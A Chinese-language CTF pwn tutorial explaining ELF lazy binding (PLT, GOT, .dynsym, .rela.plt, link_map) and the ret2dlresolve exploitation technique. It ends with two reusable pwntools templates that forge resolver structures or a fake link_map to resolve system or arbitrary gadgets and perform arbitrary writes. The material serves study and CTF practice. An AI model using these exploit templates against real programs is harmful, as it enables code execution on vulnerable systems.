---
title: ret2dlresolve
date: 2025-09-24 19:43:47
categories: 
  - CTF技巧
tags:
  - CTF
  - pwn
  - ret2dlresolve
---

# PLT & GOT

当程序需要链接动态库时，就无法在load阶段甚至动态链接阶段前得知诸如动态链接函数的具体地址。而解析动态链接符号是一个相对比较耗时的工作，因此，为提高加载效率，在一般的动态链接过程中，会将符号解析推迟到第一次使用该符号时进行，即**延迟绑定(Lazy binding)**。

延迟绑定需要两个额外的section，首先是位于RW LOAD段的.got节，即**global offset table**, 全局偏移表。实际上, .got节还分为两个子节，分别为数据表和过程表，而我们在延迟绑定中只关注过程表, 因此后续所说的got表均指的是.got.plt节的内容。got表是一个8字节数组，其中前三项分别保存着.dynamic节起始地址、link_map结构体链表头以及_dl_runtime_resolve解析函数，从第四项开始，依次保存着需要动态链接的函数的地址，但由于是延迟绑定，这个地址只有在解析函数解析后才会被写回got表，在加载阶段，这里存放的是其他地址值。

![got表](images/got表.png)

接着是位于RE LOAD段的.plt节，即**procedure linkage table**, 过程链接表, 保存动态链接函数桩代码以及解析器桩代码。.plt也分为两个子节，其中.plt.sec子节的每一项都是一个只有一条jmp指令的plt桩代码，与got表中待解析函数的每一项一一对应，jmp的目的地址即为got表中存放的地址。而.plt子节的每一项也是一段桩代码，包含一条push指令(用于传递参数), 以及一条jmp指令，除第一项外，其余每一项的jmp指令都是跳转到plt[0], 而plt[0]则是跳转到got表中存放的_dl_runtime_resolve解析函数。而got表中解析函数的每一项最开始存放的正是plt表中对应的每一项。

![plt表](images/plt表.png)

此时，如果在代码节.text执行过程中需要调用一个动态链接函数，实际上会先跳转到.plt.sec节对应的桩函数。桩函数取出got表中的地址作为跳转目的地址，而由于开始时got表存放的并不是动态链接函数的实际地址，而是.plt节对应的表项，因此实际上就会发生控制流从.plt.sec节的对应项到.plt对应项的跳转。而每一项plt备用桩都会在push一个index参数后跳转到plt[0]项解析器桩，解析器桩在push另外一个参数，即got[1]中的link_map结构体后，从got[2]中取出_dl_runtime_resolve解释函数地址并跳转过去。至此，完成控制流从elf文件到libc的交接，_dl_runtime_resolve在完成动态解析后，将解析后的地址写回got表中, 此即plt与got表实现动态函数解析的过程。

![动态函数解析过程](images/动态函数解析过程.png)

而后续调用就简单许多: 在代码节中出现一个call指令，先跳转到.plt.sec节的对应项的桩函数，其中的jmp指令从got表中取出地址，该地址已经被解析为动态链接函数的地址，因此直接就跳到该函数上，而不会再向上解析。

![后续调用过程](images/后续调用过程.png)

# dlresolve

要理解ret2dl_resolve的攻击原理, 我们还需要再来了解一下解析器函数的具体实现。在此之前，我们先来看一些特殊的节上存储的表。

首先是**动态链接表**，其中保存着其他各种动态链接过程所需要的表的起始地址。

![动态链接表](images/动态链接表.png)

然后是**动态链接字符串表**，保存着动态链接符号对应的字符串。

![动态链接字符串表](images/动态链接字符串表.png)

接着是**动态链接符号表**，其中保存着每个符号的字符串在字符串表中的偏移, 以及符号的其他信息，比如类型、绑定属性等。.dynsym节由Elf32_Sym或Elf64_Sym结构体数组组成，具体结构如下：

```c
typedef struct {
    Elf32_Word    st_name;    // 符号名称在字符串表中的偏移
    Elf32_Addr    st_value;   // 符号的值（地址或位置偏移量）
    Elf32_Word    st_size;    // 符号的大小
    unsigned char st_info;    // 符号类型和绑定属性
    unsigned char st_other;   // 符号可见性
    Elf32_Half    st_shndx;   // 符号所在的节区索引
} Elf32_Sym;

typedef struct {
    Elf64_Word    st_name;    // 符号名称在字符串表中的偏移
    unsigned char st_info;    // 符号类型和绑定属性
    unsigned char st_other;   // 符号可见性
    Elf64_Half    st_shndx;   // 符号所在的节区索引
    Elf64_Addr    st_value;   // 符号的值（地址或位置偏移量）
    Elf64_Xword   st_size;    // 符号的大小
} Elf64_Sym;
```

在gdb中也能看到符号表结构体的内容:

```gdb
pwndbg> ptype /o Elf64_Sym
type = struct {
/*      0      |       4 */    Elf64_Word st_name;
/*      4      |       1 */    unsigned char st_info;
/*      5      |       1 */    unsigned char st_other;
/*      6      |       2 */    Elf64_Section st_shndx;
/*      8      |       8 */    Elf64_Addr st_value;
/*     16      |       8 */    Elf64_Xword st_size;

                               /* total size (bytes):   24 */
                             }
```

对于`st_info`字段, 其高4位表示符号的绑定属性(Binding), 如STB_LOCAL(本地符号)、STB_GLOBAL(全局符号)和STB_WEAK(弱符号)等，而低4位表示符号类型(Type), 常见的类型有STT_NOTYPE(无类型)、STT_OBJECT(数据对象)、STT_FUNC(函数)等。

而对于`st_other`字段, 仅使用其低2位表示符号的可见性(Visibility), 包括以下几种类型:

- STV_DEFAULT(0, 默认可见性): 符号导出, 对所有模块可见。这会导致该符号**可以被抢占**。即使当前模块自己调用这个函数，也必须通过 PLT (Procedure Linkage Table) 间接调用，因为运行时可能会发现主程序里有一个同名函数需要替代它。
- STV_INTERNAL(1, 内部可见性): 符号仅在定义它的模块内可见。链接器也会强制绑定到本地，不进行全局查找。
- STV_HIDDEN(2, 隐藏可见性): 符号对其他模块不可见，但在定义它的模块内可见。效果同1。
- STV_PROTECTED(受保护可见性): 符号导出, 对其他模块可见。但该符号不可被抢占, 在链接时优先使用定义它的模块内的版本。

`st_shndx`字段表示符号所在的节区索引, 该字段的值可以是一个具体的节区索引, 也可以是一些特殊值:

- SHN_UNDEF(0, 未定义符号): 表示当前模块需要使用这个符号, 但它不在本地定义, 需要去依赖的其他共享库（.so）里找。
- 具体索引值或SHN_ABS(0xfff1, 绝对符号): 表示符号在本地定义, 或其值是一个绝对地址, 不会被重定位。

![动态链接符号表](images/动态链接符号表.png)

最后是.rela节，我们只关注其中的**过程动态链接重定位表**，其中每个表项的r_offset字段是一个指向got表对应表项的指针，而r_info字段保存着该项在符号表对应的符号索引，知道了该索引，就可以进一步找到字符串表中的符号字符串。该表的每个表项都与got表以及符号表的表项一一对应。回想一下，每个动态函数的解析过程都在plt部分的桩代码push过两次参数，第一次是每个动态链接函数对应的自己的桩代码，push了一个index，这个index即为.rela.plt表的索引值。

![动态链接重定位表](images/动态链接重定位表.png)

而第二个参数，是所有动态链接函数均会执行的plt[0]上的解析器桩所push的**link_map链表**。link_map是一个结构体，每个加载的ELF模块(包括主程序和.so文件)都对应一个link_map结构，它们以双向链表的形式链接起来，链表头即为主程序的link_map。其中的l_ld字段保存着模块中动态链接表的起始地址。但实际上解析器在寻找其他表时, 并不会直接使用该地址, 而是从l_info数组中取出对应的表地址(在ld初期由动态链接器根据动态链接表填充, 按照d_tag值依次写入对应地址)。

```gdb
pwndbg> ptype struct link_map
type = struct link_map {
    Elf64_Addr l_addr;
    char *l_name;
    Elf64_Dyn *l_ld;
    struct link_map *l_next;
    struct link_map *l_prev;
    struct link_map *l_real;
    Lmid_t l_ns;
    struct libname_list *l_libname;
    Elf64_Dyn *l_info[84];
    ...
}
```

![link_map结构体](images/link_map结构体.png)

在将这两个参数压入栈中后，plt就开始从主程序到libc的跳转，取出got[2]中的地址，将控制权交给_dl_runtime_resolve函数。

解析器函数从栈中取出参数，根据传入的link_map, 取出其中的.dynamic动态链接表，继而找到.rela.plt重定位表、.dynsym符号表以及.dynstr字符串表，然后根据第二个参数index向上查找到对应的字符串，也就是说，这里主要就做了一件事：根据函数对应的索引值找到对应的字符串。

此外, 解析器函数会先根据符号表项中的`st_other`字段检查符号的可见性, 只有当符号的可见性为STV_DEFAULT(0)时, 才会尝试去其他模块中查找该符号(通过`_dl_lookup_symbol_x`函数), 否则将直接从符号表中的`st_value`字段获取符号的地址, 然后加上模块基地址, 并将其写回got表对应项。

![查找字符串过程](images/查找字符串过程.png)

接着，解析器根据这个字符串遍历link_map链表，刚刚提到，每一个加载的elf模块都对应一个link_map结构体，这里就依次遍历这些模块链表，从各自的符号表中匹配函数名字符串。

当找到目标函数后，将地址写回got表对应表项。

最后通过jmp指令跳转到目标函数执行。

注意这里的jmp，自始至终，只有最开始的.text节中使用了**call**指令，其余每次控制权转移使用的都是**jmp**指令，也就是说只有最开始那里将下一条返回地址压栈，而这里jmp到目标函数里面执行后，最后的**ret**指令返回就会直接返回到最开始call的下一条指令，这就完成了动态解析到执行的全过程。

![解析器函数执行过程](images/解析器函数执行过程.png)

# ret2dlresolve

到这里，利用思路就很明显了，就是通过伪造解析器函数要查询的字符串，使其返回我们需要的函数地址。

首先是没有重定位保护的情况，此时整个数据段都是可写的，我们可以直接改写诸如动态链接表中的字符串表的地址，使其指向我们伪造的一张字符串表，这样解析器最后拿到的就是我们伪造的函数名字符串，比如system，然后返回system函数对应的地址。

这里我们主要介绍在开启部分重定位保护的情况，此时数据段的前面部分直到got表的前三项都是只读的，无法直接修改各个表的地址，但注意到传给解析器函数的第二个参数index，这是.rela.plt重定位表的索引，如果我们**伪造一个比较大的索引值**作为参数传递，使其指向一个我们能控制的区域（比如.bss节）上的**伪造的重定位表项**，然后这个伪造的重定位表项再指向**伪造的符号表表项**，最终指向一个**伪造的字符串表项**，这样解析器最后得到的就是我们伪造的字符串，然后返回这个伪造的字符串对应的函数地址。

至于怎么将伪造的重定位表项作为参数传递给解析器，我们可以提前在栈上写入该索引，然后将栈中返回地址设置为plt[0]项，使其直接返回到解析器桩跳转到解析器，即**ret2dl_resolve**。

这种方法需要伪造**三个表项**，且需要注意各个表项的对齐要求:

![伪造表项](images/伪造表项.png)

# linkmap

然而, 上述利用方式只能解析已有函数(需要函数名字符串), 但如果想要解析出一个gadget地址出来，就需要通过**伪造link_map结构体的ret2dlresolve**来实现。

在`_dl_runtime_resolve`函数中, 解析器会先从传入的link_map结构体中取出各个表在动态链接表中的位置。因此, 如果我们伪造一个link_map结构体, 并将其中的各个表地址指向其他地方, 那么解析器就会根据各个表项中字段的不同含义按照我们的方式进行解析。

这种方式的关键在于, 当解析器函数发现符号表项中的`st_other`字段不为0时, 它就不会去其他模块中查找该符号, 而是直接从符号表中的`st_value`字段获取符号的地址, 然后加上模块基地址, 并将其写回got表对应项。也就是说, 只要我们将link_map结构体中的符号表指针套在got表上, 并将伪造的符号表项中的`st_value`字段设置为我们想要的gadget地址减去got表地址, 那么解析器函数就会解析出该gadget地址写回got表中, 达到任意地址解析的目的。

这里需要注意, 对`st_other`字段的检查是通过`表项+5B`偏移的那个字节先与上0x3再与0比较的, 因此需要保证该字节的低十六进制数不能为**0、4、8或c**, 否则会被认为是0, 导致去其他模块中查找符号, 解析失败。

此外, 由于relo表项中的`r_offset`字段保存着got表对应项的地址, 用于之后的写回, 那么这里我们也可以将其设置为其他地址依次决定解析出来的地址是否写回got表, 或者写回到哪里, 从而实现任意地址写入。

这种方法需要伪造**一个link_map结构体**, relo表项可以覆写在link_map结构体里面用于节省空间, sym表项直接套在got表上, 只需在link_map结构体中写入对应的指针即可; 而str表项则完全不需要, 表指针设置为0即可。

# 板子

综上, 我们可以写出两套ret2dlresolve利用模版, 一套是普通的ret2dlresolve, 另一套是伪造link_map结构体的ret2dlresolve.

```python
#!/usr/bin/env python3
from pwn import *

def ret2dlresolve(elf, fake_data_addr, got_func, target_func) -> tuple[bytes, bytes]:
    r"""
    Ret2dlresolve without constructing fake linkmap.

    Arguments:
        elf(ELF): The ELF object of the binary
        fake_data_addr(int): Address where the fake data will be placed
        got_func(str): Name of the function to be replaced
        target_func(str): Name of the target function to be resolved

    Returns:
        tuple[bytes,bytes]:

        dlresolve_rop(bytes): The ROP chain to invoke the dynamic linker resolver(0x18)

        fake_data(bytes): The constructed fake data as bytes(0x50)

    Example:
        >>> plt0 = elf.get_section_by_name(".plt").header.sh_addr
        >>> dlresolve_rop, fake_data = ret2dlresolve(elf, fake_data_addr, 'setvbuf', 'puts')
        >>> payload = dlresolve_rop + other_gadgets + fake_data
    """
    # construct fake .dynstr entry
    dyn_str = elf.get_section_by_name(".dynstr").header.sh_addr
    fake_dyn_str_entry_addr = fake_data_addr
    fake_dyn_str_entry_offset = fake_dyn_str_entry_addr - dyn_str
    fake_dyn_str_entry = target_func.encode() + b'\0'

    # construct fake .dynsym entry, need to align to 0x18 from .dynsym
    dyn_sym = elf.get_section_by_name(".dynsym").header.sh_addr
    fake_dyn_sym_entry_index = (fake_dyn_str_entry_addr + len(fake_dyn_str_entry) - dyn_sym + 23) // 24 
    fake_dyn_sym_entry_addr = dyn_sym + fake_dyn_sym_entry_index * 24
    padding1 = b"A" * (fake_dyn_sym_entry_addr - (fake_dyn_str_entry_addr + len(fake_dyn_str_entry)))
    fake_dyn_sym_entry = p32(fake_dyn_str_entry_offset) + p32(0) + p64(0) + p64(0)

    # construct fake .rela.plt entry, need to align to 0x18 from .rela.plt
    rela_plt = elf.get_section_by_name(".rela.plt").header.sh_addr
    fake_rela_plt_entry_index = (fake_dyn_sym_entry_addr + len(fake_dyn_sym_entry) - rela_plt + 23) // 24
    fake_rela_plt_entry_addr = rela_plt + fake_rela_plt_entry_index * 24
    padding2 = b"A" * (fake_rela_plt_entry_addr - (fake_dyn_sym_entry_addr + len(fake_dyn_sym_entry)))
    fake_rela_plt_entry = p64(elf.got[got_func]) + p32(0x7) + p32(fake_dyn_sym_entry_index) + p64(0)

    fake_data = fake_dyn_str_entry + padding1 + fake_dyn_sym_entry + padding2 + fake_rela_plt_entry

    # the rop chain
    plt0 = elf.get_section_by_name(".plt").header.sh_addr
    dlresolve_rop = p64(plt0) + p64(fake_rela_plt_entry_index)

    return dlresolve_rop, fake_data
```

```python
#!/usr/bin/env python3
from pwn import *

def ret2dlresolve_linkmap(elf, libc_elf, fake_linkmap_addr, got_func, target_func, write_back=True, write_addr=0) -> tuple[bytes, bytes]:
    r"""
    Ret2dlresolve with constructing fake linkmap.

    Arguments:
        elf(ELF): The ELF object of the binary
        libc_elf(ELF): The ELF object of the libc
        fake_linkmap_addr(int): Address where the fake link map will be placed
        got_func(str): Name of the function to be used/replaced
        target_func(str/list): Name of the target function or the list of target gadgets to be resolved
        write_back(bool): Whether to write back to the GOT entry
        write_addr(int): Other address to write the resolved address if write_back is False, 0 for ignored

    Returns:
        tuple[bytes,bytes]:

        dlresolve_rop(bytes): The ROP chain to invoke the dynamic linker resolver(0x18)

        fake_linkmap(bytes): The constructed fake linkmap as bytes(0x100)

    Example:
        >>> plt0 = elf.get_section_by_name(".plt").header.sh_addr
        >>> dlresolve_rop, fake_linkmap = ret2dlresolve_linkmap(elf, libc_elf, linkmap_addr, 'read', 'puts')
        >>> payload = dlresolve_rop + other_gadgets + fake_linkmap
        >>> ...
        >>> dlresolve_rop, fake_linkmap = ret2dlresolve_linkmap(elf, libc_elf, linkmap_addr, 'read', ["pop rdi", "ret"], write_back=False)
    """
    # get the address in got_addr, add the offset, jump to the result address, and write it back to got_addr if write_back is True
    # Actually, the got_addr can be any addr contains the libc address
    # Change the got_addr to get any address you want
    # Change the write_back_addr to to write the resolved address to anywhere you want
    got_addr = elf.got[got_func]
    got_func_offset = libc_elf.symbols[got_func]
    target_func_offset = target_func if isinstance(target_func, int) else (libc_elf.symbols[target_func] if isinstance(target_func, str) else ROP(libc_elf).find_gadget(target_func).address)

    DT_STRTAB = 5
    DT_SYMTAB = 6
    DT_JMPREL = 23

    # construct fake linkmap
    l_addr = target_func_offset - got_func_offset
    l_addr &= 0xFFFFFFFFFFFFFFFF
    fake_linkmap = p64(l_addr) # l_addr, both the resolved address and the write back address will add this offset
    fake_linkmap += p64(0)  # l_name

    # construct fake .dynamic entries 
    fake_linkmap += p64(DT_STRTAB) + p64(0) # (l_ld、l_next) -> fake .dynamic DT_STRTAB, .dynstr can be NULL
    fake_linkmap += p64(DT_SYMTAB) + p64(got_addr - 0x8) # (l_prev、l_add) -> fake .dynamic DT_SYMTAB
    fake_linkmap += p64(DT_JMPREL) + p64(fake_linkmap_addr + 0x40)  # (l_refcnt、l_scope) -> fake .dynamic DT_JMPREL
    
    # construct fake .rela.plt
    write_back_addr = got_addr if write_back else write_addr if write_addr != 0 else (fake_linkmap_addr + 0x8)
    write_back_addr -= l_addr
    write_back_addr &= 0xFFFFFFFFFFFFFFFF
    fake_rela_plt = p64(write_back_addr) + p32(0x7) + p32(0) + p64(0)
    fake_linkmap += fake_rela_plt  # l_info[0, 3] -> fake .rela.plt entry

    # l_info padding
    fake_linkmap += p64(0) * (DT_STRTAB - 3)  # l_info[3, DT_STRTAB]
    fake_linkmap += p64(fake_linkmap_addr + 0x10) # l_info[DT_STRTAB]
    fake_linkmap += p64(0) * (DT_SYMTAB - DT_STRTAB - 1)  # l_info[DT_STRTAB+1, DT_SYMTAB]
    fake_linkmap += p64(fake_linkmap_addr + 0x20) # l_info[DT_SYMTAB]
    fake_linkmap += p64(0) * (DT_JMPREL - DT_SYMTAB - 1)  # l_info[DT_SYMTAB+1, DT_JMPREL]
    fake_linkmap += p64(fake_linkmap_addr + 0x30) # l_info[DT_JMPREL]

    # the rop chain
    plt0 = elf.get_section_by_name(".plt").header.sh_addr
    dlresolve_rop = p64(plt0 + 6) + p64(fake_linkmap_addr) + p64(0)
    
    return dlresolve_rop, fake_linkmap
```